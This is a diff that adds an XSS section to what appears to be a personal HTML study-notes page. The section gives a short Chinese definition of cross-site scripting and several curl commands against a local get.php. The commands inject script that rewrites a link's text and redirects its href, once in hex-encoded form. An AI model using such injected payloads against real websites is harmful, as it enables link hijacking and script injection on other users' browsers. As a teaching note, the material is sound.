@@ -12,6 +12,7 @@
       <br /><a href="#CGI"><li class="title">CGI</li></a>
       <br /><a href="#CSS selector"><li class="title">CSS selector</li></a>
       <br /><a href="#XPath"><li class="title">XPath</li></a>
+      <br /><a href="#XSS"><li class="title">XSS</li></a>
       <br /><a href="#reference"><li class="title">Reference</li></a>
       <div class="context">
       </div>
@@ -514,7 +515,26 @@
       </table>
       <hr />
 
+<!-- HTML -->
+      <a name="XSS"></a><h2>XSS</h2>
+      <p class="h3">XSS (Cross Site Script, 跨站腳本攻擊), 指的是惡意攻擊者往 網頁面裏插入惡意 html 代碼, 當使用者瀏覽網頁時, 嵌入其中Web裏面的 html 代碼被執行, 而達到攻擊者的特殊目的. XSS 屬於被動式的攻擊, 因為其被動且不好利用, 所以許多人常呼略其危害性.</p>
  
+      <div class="commands">Linux:~ # <span class="cmds">curl</span> http://127.0.0.1/get.php?name_php=&lt;a href=&quot;http://www.google.com&quot;>Google&lt;/a&gt;&amp;age_php=10
+      <br />
+      <br />
+
+      <br />Linux:~ # <span class="cmds">curl</span> http://127.0.0.1/get.php?name_php=&lt;a href=&quot;http://www.google.com&quot;&gt;Google&lt;/a&gt;&amp;age_php=10&lt;script&gt;document.getElementsByTagName('a')[0].innerHTML = 'Yahoo' &lt;/script&gt;
+      <br />
+      <br />
+
+      <br />Linux:~ # <span class="cmds">curl</span> http://127.0.0.1/get.php?name_php=&lt;a href=&quot;http://www.google.com&quot;&gt;Google&lt;/a&gt;&amp;lage_php=10&lt;script&gt;document.getElementsByTagName('a')[0].setAttribute('href', 'http://www.yahoo.com') &lt;/script&gt;
+      <br />
+      <br />
+
+      <br /><span class="cmts">ASCII characters to hex</span>
+      <br />Linux:~ # <span class="cmds">curl</span> http://127.0.0.1/get.php?name_php=&lt;a href=&quot;http://www.google.com&quot;&gt;Google&lt;/a&gt;&amp;age_php=10%3c%73%63%72%69%70%74%3e%64%6f%63%75%6d%65%6e%74%2e%67%65%74%45%6c%65%6d%65%6e%74%73%42%79%54%61%67%4e%61%6d%65%28%27%61%27%29%5b%30%5d%2e%73%65%74%41%74%74%72%69%62%75%74%65%28%27%68%72%65%66%27%2c%20%27%68%74%74%70%3a%2f%2f%77%77%77%2e%79%61%68%6f%6f%2e%63%6f%6d%27%29%20%3c%2f%73%63%72%69%70%74%3e
+      </div>
+
 <!-- reference -->
     <h2>Reference</h2>
     <li class="reference"><a href="http://www.w3schools.com/">W3CSchools.com</a></li>
